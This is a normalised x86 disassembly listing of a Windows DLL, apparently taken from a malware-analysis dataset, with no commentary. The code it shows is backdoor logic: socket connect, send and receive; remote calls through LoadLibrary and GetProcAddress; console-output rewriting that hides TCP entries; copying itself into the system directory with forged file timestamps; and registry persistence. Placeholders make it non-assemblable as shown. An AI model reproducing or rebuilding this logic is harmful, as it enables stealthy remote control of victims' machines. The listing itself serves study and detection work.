push esi
call ??3@YAXPAX@Z
add esp 0x4
xor esi esi
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
retn 0x4
push edi
push esi
call sub_10002710
sub_10002320
push esi
mov esi ecx
mov eax [ esi + 0x2c ]
mov [ esi + 0x38 ] 0x0
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
jle r-xdata
push 0x1f40
push eax
call [ WaitForSingleObject@IAT ]
pop esi
retn 0x4
mov ecx [ esi + 0x2c ]
test ecx ecx
jne r-xdata
push eax
push esi
call sub_10005e80
add esp 0x8
sub_10002360
push esi
mov esi [ esp + 0x8 ]
push edi
cmp [ esi ] 0x20202020
jne r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
cmp [ esi + 0x4 ] 0x20202020
je r-xdata
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
pop edi
xor eax eax
pop esi
retn
cmp [ esi ] 0x54
jne r-xdata
cmp [ esi + 0x1 ] 0x43
jne r-xdata
cmp [ esi + 0x2 ] 0x50
jne r-xdata
cmp [ esi + 0x3 ] 0x20
jne r-xdata
add esi 0x4
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
mov edi [ strchr@IAT ]
push 0x20
push esi
call edi
add esp 0x8
test eax eax
je r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx esi
jbe r-xdata
cmp [ ecx ] 0x3a
je r-xdata
cmp ecx esi
jbe r-xdata
dec ecx
cmp ecx esi
ja r-xdata
inc ecx
cmp ecx eax
jae r-xdata
lea esi [ eax + 0x1 ]
mov dl [ ecx ]
cmp dl 0x30
jl r-xdata
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp dl 0x39
jg r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
push 0x20
push esi
call edi
mov edi eax
add esp 0x8
test edi edi
je r-xdata
inc ecx
cmp ecx eax
jb r-xdata
lea eax [ edi - 0x1 ]
cmp eax esi
jbe r-xdata
cmp [ eax ] 0x3a
je r-xdata
cmp eax esi
jbe r-xdata
dec eax
cmp eax esi
ja r-xdata
inc eax
cmp eax edi
mov edx eax
jae r-xdata
pop edi
xor eax eax
pop esi
retn
push edx
call [ atoi@IAT ]
xor ecx ecx
add esp 0x4
mov cx [ rw-data ]
cmp ecx eax
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
lea edx [ edi + 0x1 ]
cmp cl 0x39
jg r-xdata
inc edx
jmp r-xdata
cmp al 0x9
jne r-xdata
inc eax
cmp eax edi
jb r-xdata
mov al [ edx ]
cmp al 0x20
je r-xdata
mov ecx 0xb
mov edi rw-data
mov esi edx
xor eax eax
[ esi ] [ edi ]
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov ecx 0x2
mov edi rw-data
mov esi edx
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov esi edx
mov ecx 0x9
mov edi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
sub_100024b0
sub esp 0xc
push ebx
push ebp
movsx ebp [ esp + 0x1c ]
push esi
mov eax [ esp + 0x1c ]
movsx esi [ esp + 0x22 ]
push edi
xor edi edi
lea ebx [ esi - 0x1 ]
mov [ esp + 0x14 ] edi
imul ebx ebp
add ebx eax
lea eax [ ebp + 0x1 ]
push eax
mov [ esp + 0x1c ] ebx
call ??2@YAPAXI@Z
add esp 0x4
cmp esi edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x20 ] edi
jle r-xdata
mov eax [ esp + 0x10 ]
push eax
call ??3@YAXPAX@Z
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov edi [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
mov esi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
push eax
[ edi ] [ esi ]
mov [ eax + ebp ] 0x0
call sub_10002360
add esp 0x4
test eax eax
jne r-xdata
mov ecx ebp
lea esi [ ebx + ebp ]
imul ecx [ esp + 0x20 ]
mov eax ecx
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x20202020
and ecx 0x3
mov [ esp + 0x14 ] 0x1
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
mov ecx ebp
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esp + 0x20 ]
sub ebx ebp
movsx ecx [ esp + 0x26 ]
inc eax
cmp eax ecx
mov [ esp + 0x20 ] eax
jl r-xdata
jmp r-xdata
sub_10002590
sub esp 0x6c
push ebx
push ebp
push esi
push edi
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov ebp eax
mov [ esp + 0x18 ] ebp
call sub_100041e0
xor ebx ebx
cmp ebp ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x6c
retn
push 0x64
call [ Sleep@IAT ]
call [ GetForegroundWindow@IAT ]
mov esi eax
lea eax [ esp + 0x3c ]
push 0x40
push eax
push esi
mov [ esp + 0x48 ] 0x0
call [ GetClassNameA@IAT ]
lea ecx [ esp + 0x3c ]
push rw-data
push ecx
call [ _stricmp@IAT ]
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x10 ]
mov [ esp + 0x10 ] ebx
push edx
push esi
call [ GetWindowThreadProcessId@IAT ]
mov eax [ esp + 0x10 ]
push eax
call ebp
test eax eax
je r-xdata
push 0xfffffff5
call [ GetStdHandle@IAT ]
lea ecx [ esp + 0x24 ]
mov edi eax
push ecx
push edi
call [ GetConsoleScreenBufferInfo@IAT ]
test eax eax
je r-xdata
call [ FreeConsole@IAT ]
jmp r-xdata
movsx esi [ esp + 0x26 ]
movsx edx [ esp + 0x24 ]
imul esi edx
lea eax [ esi + 0x4 ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ esp + 0x16 ] bx
mov [ esp + 0x14 ] bx
mov ebx [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
mov ebp eax
push ecx
push ebx
push esi
push ebp
push edi
call [ ReadConsoleOutputCharacterA@IAT ]
mov edx [ esp + 0x24 ]
push edx
push ebp
call sub_100024b0
add esp 0x8
test eax eax
je r-xdata
push ebp
call ??3@YAXPAX@Z
mov ebp [ esp + 0x1c ]
add esp 0x4
xor ebx ebx
dec [ esp + 0x2a ]
mov eax [ esp + 0x28 ]
push eax
push edi
call [ SetConsoleCursorPosition@IAT ]
lea ecx [ esp + 0x20 ]
push ecx
push ebx
push esi
push ebp
push edi
call [ WriteConsoleOutputCharacterA@IAT ]
sub_100026c0
mov eax ecx
mov dx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x1c ] ecx
xor ecx ecx
mov [ eax + 0x10 ] dx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
retn 0xc
sub_10002710
push ecx
push ebx
mov ebx ecx
push ebp
push esi
mov eax [ ebx + 0x14 ]
xor esi esi
cmp eax esi
push edi
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
mov ecx [ ebx + 0x18 ]
lea eax [ esp + 0x10 ]
push eax
push 0x8004667e
push ecx
mov [ esp + 0x1c ] esi
call ioctlsocket
mov edi [ esp + 0x1c ]
cmp edi esi
jle r-xdata
mov ebp [ esp + 0x18 ]
add esi eax
cmp esi edi
jl r-xdata
mov ecx [ ebx + 0x18 ]
mov edx edi
sub edx esi
push 0x0
lea eax [ esi + ebp ]
push edx
push eax
push ecx
call send
test eax eax
jle r-xdata
sub_10002770
sub esp 0x10
push esi
push edi
push 0x0
push 0x1
mov esi ecx
push 0x2
call socket
mov cx [ esi + 0x10 ]
mov edi eax
xor eax eax
push ecx
mov [ esp + 0xc ] eax
mov [ esp + 0xc ] 0x2
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
call htons
mov edx [ esi + 0xc ]
mov [ esp + 0xa ] ax
lea eax [ esp + 0x8 ]
push 0x10
push eax
push edi
mov [ esp + 0x18 ] edx
call connect
cmp eax 0xffffffff
jne r-xdata
mov eax edi
pop edi
pop esi
add esp 0x10
retn
push edi
call closesocket
pop edi
xor eax eax
pop esi
add esp 0x10
retn
sub_100027e0
mov eax 0x2104
call sub_100099c0
push ebx
push esi
mov esi [ esp + 0x2110 ]
xor ebx ebx
push edi
mov eax [ esi + 0x4 ]
mov edi [ esi + 0x18 ]
cmp eax ebx
jne r-xdata
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x14 ] ebx
pop edi
pop esi
pop ebx
add esp 0x2104
retn
push ebx
push ebx
lea eax [ esp + 0x14 ]
push ebx
push eax
push ebx
mov [ esp + 0x24 ] edi
mov [ esp + 0x20 ] 0x1
mov [ esi ] ebx
call select
cmp [ esi ] ebx
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax [ esi + 0x18 ]
push eax
jmp r-xdata
cmp eax 0x1
jne r-xdata
call closesocket
mov ecx [ esi + 0x1c ]
push ebx
push ebx
push ebx
push 0xffffffff
push 0xa017
mov [ esi + 0x18 ] ebx
call sub_10001f60
cmp [ esi + 0x4 ] ebx
je r-xdata
push ebx
lea ecx [ esp + 0x114 ]
push 0x2000
push ecx
push edi
call recv
cmp eax ebx
jle r-xdata
jmp r-xdata
mov ecx [ esi + 0x18 ]
push ecx
mov ecx [ esi + 0x1c ]
push ebx
lea edx [ esp + 0x114 ]
push eax
push edx
push 0xffffffff
push 0xa016
call sub_10001f60
sub_100028a0
push esi
mov esi ecx
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
pop esi
retn
call sub_10002910
mov ecx esi
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x14 ] 0x0
call sub_10002770
test eax eax
mov [ esi + 0x18 ] eax
jne r-xdata
push esi
push 0x0
push sub_100027e0
call [ _beginthread@IAT ]
add esp 0xc
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] 0x1
pop esi
retn
sub_10002910
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] 0x1
test eax eax
je r-xdata
pop esi
retn
mov eax [ esi + 0x18 ]
mov [ esi ] 0x1
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
push 0x4e20
push eax
call [ WaitForSingleObject@IAT ]
push eax
call closesocket
mov [ esi + 0x18 ] 0x0
sub_10002950
mov ecx [ esp + 0x4 ]
mov al [ ecx ]
test al al
jne r-xdata
xor edx edx
xor eax eax
retn
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
inc edx
cmp al 0x2c
jne r-xdata
lea eax [ edx + 0x1 ]
retn
sub_10002970
sub esp 0x8
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
mov cl [ ebp ]
test cl cl
jne r-xdata
or eax 0xffffffff
cmp cl 0x30
jl r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
mov esi [ ebp ]
mov edx rw-data
cmp esi [ edx ]
jne r-xdata
cmp cl 0x39
jg r-xdata
cmp cl 0x5b
jne r-xdata
mov eax [ esp + 0x1c ]
xor ecx ecx
pop edi
pop esi
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax ] 0x1
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
xor eax eax
pop ebp
add esp 0x8
retn
xor esi esi
cmp cl 0x30
mov [ esp + 0x18 ] esi
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x8
retn
mov al [ ebp + 0x1 ]
inc ebp
cmp al 0x69
je r-xdata
push ebp
call [ atoi@IAT ]
add esp 0x4
movsx eax [ ebp + 0x1 ]
push eax
call [ tolower@IAT ]
add esp 0x4
cmp eax 0x78
jne r-xdata
mov esi [ esp + 0x1c ]
xor ecx ecx
cmp al 0x6f
sete cl
inc ebp
mov [ esi + 0x4 ] ecx
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x1
cmp [ ebp ] 0x5d
je r-xdata
cmp al 0x6f
je r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
push ebp
call [ sscanf@IAT ]
mov eax [ esp + 0x24 ]
add esp 0xc
jmp r-xdata
mov al [ ebp + 0x1 ]
inc ebp
cmp al 0x22
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
mov ecx [ esp + 0x1c ]
pop edi
mov [ ecx + 0x4 ] esi
mov [ ecx ] esi
mov [ ecx + 0x8 ] esi
mov [ ecx + 0xc ] esi
mov [ ecx + 0x10 ] eax
pop esi
xor eax eax
pop ebp
add esp 0x8
retn
inc ebp
push 0x22
push ebp
call [ strchr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
sub eax ebp
mov edx eax
and edx 0x80000001
jns r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0xc ] eax
add eax 0x8
push eax
call ??2@YAPAXI@Z
mov edi eax
add esp 0x4
test edi edi
mov [ esi + 0x8 ] edi
jne r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
mov ecx [ esi + 0xc ]
xor eax eax
add ecx 0x8
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ esi + 0xc ]
xor edi edi
test eax eax
jle r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x8
retn
xor eax eax
push ebx
mov ebx [ sscanf@IAT ]
mov al [ ebp ]
mov cl [ ebp + 0x1 ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x10 ] al
push edx
lea eax [ esp + 0x14 ]
push rw-data
push eax
mov [ esp + 0x1d ] cl
mov [ esp + 0x1e ] 0x0
call ebx
mov ecx [ esi + 0x8 ]
mov dl [ esp + 0x2c ]
add esp 0xc
add ebp 0x2
mov [ edi + ecx ] dl
mov eax [ esi + 0xc ]
inc edi
cmp edi eax
jl r-xdata
pop ebx
sub_10002b50
mov eax [ esp + 0x8 ]
push ebx
mov ebx [ esp + 0x8 ]
test eax eax
jle r-xdata
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop ebx
retn
push esi
push edi
lea esi [ ebx + 0x8 ]
mov edi eax
add esi 0x14
dec edi
jne r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
sub_10002b90
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
call sub_10002950
mov edi eax
add esp 0x4
test edi edi
jne r-xdata
lea eax [ edi + edi * 4 ]
shl eax 0x2
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov ebp eax
test edi edi
mov [ esp + 0x14 ] ebp
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
xor ebx ebx
test edi edi
jle r-xdata
lea eax [ ebp + 0x8 ]
mov ecx edi
mov edx [ esp + 0x18 ]
mov eax edi
pop edi
pop esi
mov [ edx ] ebp
pop ebp
pop ebx
retn
mov al [ esi ]
cmp al 0x20
je r-xdata
mov [ eax ] 0x0
add eax 0x14
dec ecx
jne r-xdata
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
push ebp
push esi
call sub_10002970
add esp 0x8
test eax eax
jl r-xdata
mov ecx [ esp + 0x14 ]
push edi
push ecx
call sub_10002b50
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
inc esi
push 0x2c
push esi
call [ strchr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ebp [ esp + 0x14 ]
inc esi
inc ebx
add ebp 0x14
cmp ebx edi
jl r-xdata
sub_10002c40
push ebp
push esi
mov esi [ esp + 0x18 ]
test esi esi
lea ebp [ esi * 4 + 0x4c ]
mov [ esp + 0x18 ] ebp
jle r-xdata
push ebp
call ??2@YAPAXI@Z
mov edx eax
add esp 0x4
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx esi
add eax 0x8
pop esi
pop ebp
retn
mov ecx ebp
push ebx
mov ebx ecx
push edi
xor eax eax
mov edi edx
shr ecx 0x2
[ edi ]
mov ecx ebx
mov ebx edx
and ecx 0x3
add edx 0x4
[ edi ]
mov ecx [ esp + 0x18 ]
mov [ edx - 0x4 ] ecx
mov [ edx ] 0x0
add edx 0x4
test esi esi
jle r-xdata
add eax 0x14
dec ecx
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov [ edx ] 0xffffffff
mov ecx [ esp + 0x14 ]
sub edx ebx
push 0x0
add edx 0x4
push edx
push ebx
push ebp
push 0x9fe2
call sub_10001f60
push ebx
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop ebx
mov eax [ esp + 0x1c ]
mov [ esp + 0x1c ] esi
add eax 0xc
mov edx [ eax - 0x4 ]
test edx edx
je r-xdata
mov [ esp + 0x18 ] ebp
add ebp [ eax + 0x4 ]
mov ecx [ esp + 0x1c ]
add eax 0x14
dec ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ eax - 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax ]
mov esi [ eax - 0x4 ]
add edx 0x4
mov ebp ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov ebp [ esp + 0x20 ]
and ecx 0x3
[ edi ] [ esi ]
add edx [ eax ]
sub_10002d30
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
mov [ ebp - 0x1c ] edi
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi * 4 ]
push eax
call ??2@YAPAXI@Z
add esp 0x4
mov [ ebp - 0x34 ] eax
mov edx eax
mov [ ebp - 0x24 ] edx
xor eax eax
call [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
cmp [ ebp + 0x18 ] edi
jne r-xdata
lea ecx [ eax + eax * 4 ]
mov ebx [ ebp + 0x10 ]
lea ecx [ ebx + ecx * 4 ]
cmp [ ecx ] edi
jne r-xdata
push esi
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_10002c40
add esp 0x10
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esi * 4 ]
xor eax eax
jmp r-xdata
mov ecx [ ecx + 0x8 ]
mov [ edx + eax * 4 ] ecx
inc eax
jmp r-xdata
mov ecx [ ecx + 0x10 ]
mov [ edx + eax * 4 ] ecx
inc eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
lea edx [ esi * 4 ]
mov [ ebp - 0x2c ] edx
pushad
sub esp [ ebp - 0x2c ]
mov ecx [ ebp + 0x14 ]
mov esi [ ebp - 0x24 ]
mov edi esp
cld
[ edi ] [ esi ]
call [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
add esp [ ebp - 0x28 ]
popad
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x38 ] eax
push eax
call ??3@YAXPAX@Z
add esp 0x4
jmp r-xdata
mov [ ebp - 0x30 ] eax
cmp eax esi
jge r-xdata
sub_10002e30
sub esp 0x8
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov ecx [ eax ]
mov esi [ eax + 0x4 ]
push edi
push eax
mov [ esp + 0x18 ] ecx
call ??3@YAXPAX@Z
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
lea ebx [ ecx + esi + 0x1 ]
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov al [ esi ]
not ecx
dec ecx
test al al
mov dl [ ecx + ebx + 0x1 ]
lea ebp [ ecx + ebx + 0x1 ]
mov [ esp + 0x10 ] dl
je r-xdata
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp [ ebx ] 0x0
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
push ebx
push edi
call [ GetProcAddress@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
push edi
call [ FreeLibrary@IAT ]
lea eax [ esp + 0x1c ]
inc ebp
push eax
push ebp
mov [ esp + 0x24 ] 0x0
call sub_10002b90
add esp 0x8
test eax eax
jl r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x1c ]
and ecx 0xff
push ecx
push eax
mov eax [ esp + 0x1c ]
push edx
push ebx
push eax
call sub_10002d30
add esp 0x14
push edi
call [ FreeLibrary@IAT ]
mov ecx [ esp + 0x1c ]
push ecx
call ??3@YAXPAX@Z
push esi
call ??3@YAXPAX@Z
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_10002f20
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + 0x1 ]
push edi
call ??2@YAPAXI@Z
mov ecx edi
mov esi eax
mov edx ecx
xor eax eax
mov edi esi
add esp 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
push esi
[ edi ]
mov edi [ esp + 0x18 ]
mov ecx edi
call sub_10001870
cmp eax ebx
je r-xdata
push 0x210
call ??2@YAPAXI@Z
push eax
push 0x0
push sub_10002e30
mov [ eax ] edi
mov [ eax + 0x4 ] esi
call [ _beginthread@IAT ]
add esp 0x10
push esi
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop esi
pop ebx
retn
sub_10002f90
sub esp 0x104
lea eax [ esp ]
push ebx
push esi
push edi
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x80
push 0x3
mov ecx ebx
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x20 ]
push 0x80000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
mov ecx [ esp + 0x11c ]
mov edx [ esp + 0x118 ]
mov esi eax
mov eax [ esp + 0x114 ]
push ecx
push edx
push eax
push esi
call [ GetFileTime@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
pop ebx
add esp 0x104
retn
sub_10003030
sub esp 0x220
mov ecx 0x41
xor eax eax
push ebx
push esi
push edi
lea edi [ esp + 0x24 ]
[ edi ]
lea eax [ esp + 0x24 ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x230 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x24 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x220
retn
mov edx [ rw-data ]
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x128 ]
[ edi ]
lea ecx [ esp + 0x128 ]
push 0x104
push ecx
push edx
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x24 ]
push 0x0
lea ecx [ esp + 0x12c ]
push eax
push ecx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x10 ]
push eax
push ecx
call sub_10002f90
add esp 0xc
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
lea edx [ esp + 0x38 ]
push 0x80000100
push edx
call [ CreateFileA@IAT ]
mov esi eax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x1c ]
push eax
lea edx [ esp + 0x10 ]
push ecx
push edx
push esi
call [ SetFileTime@IAT ]
push esi
call [ CloseHandle@IAT ]
sub_10003170
sub esp 0x210
push ebx
mov ebx [ esp + 0x218 ]
push ebp
mov ebp [ sprintf@IAT ]
push ebx
lea eax [ esp + 0x14 ]
push rw-data
push eax
call ebp
add esp 0xc
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x10 ]
mov [ esp + 0x8 ] 0x0
push ecx
push edx
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x114 ]
push 0x104
push ecx
call [ GetSystemDirectoryA@IAT ]
lea edx [ esp + 0x8 ]
lea eax [ esp + 0x10 ]
push edx
push eax
push 0x80000002
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x8 ]
push eax
call [ RegCloseKey@IAT ]
pop ebp
pop ebx
add esp 0x210
retn
pop ebp
pop ebx
add esp 0x210
retn
mov edx [ esp + 0x8 ]
push esi
mov esi [ RegSetValueExA@IAT ]
push edi
lea ecx [ esp + 0x14 ]
push 0x4
push ecx
push 0x4
push eax
mov edi 0x1
push rw-data
push edx
mov [ esp + 0x2c ] edi
call esi
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x14 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push ecx
mov [ esp + 0x2c ] 0x0
call esi
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x4
push edx
push 0x4
push 0x0
push rw-data
push eax
mov [ esp + 0x2c ] edi
call esi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ esp + 0x14 ]
push ebx
push 0x1
push eax
push rw-data
push ecx
call esi
lea edx [ esp + 0x11c ]
push ebx
push edx
lea eax [ esp + 0x20 ]
push rw-data
push eax
call ebp
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
mov edx [ esp + 0x10 ]
dec ecx
push ecx
lea ecx [ esp + 0x1c ]
push ecx
push 0x1
push eax
push rw-data
push edx
call esi
mov eax [ esp + 0x10 ]
push eax
call [ RegCloseKey@IAT ]
pop edi
pop esi
sub_100032d0
sub esp 0x1c0
push ebx
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor ebx ebx
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x150 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x150 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
mov [ esp + 0x18 ] ebx
[ edi ] [ esi ]
mov edi [ esp + 0x1d4 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x10 ] ebx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x154 ]
push ecx
push 0x80000002
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x1c0
retn
mov esi [ RegQueryValueExA@IAT ]
lea edx [ esp + 0x24 ]
lea eax [ esp + 0x1c ]
push edx
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push ebx
mov edi 0x4
push rw-data
push edx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x3c ] edi
call esi
mov ebp [ RegSetValueExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push edx
push rw-data
push eax
mov [ esp + 0x20 ] ebx
call [ RegOpenKeyA@IAT ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] edi
jne r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x4c ]
lea edx [ esp + 0x24 ]
[ edi ]
lea eax [ esp + 0x4c ]
push edx
mov edx [ esp + 0x18 ]
lea ecx [ esp + 0x24 ]
push eax
push ecx
push ebx
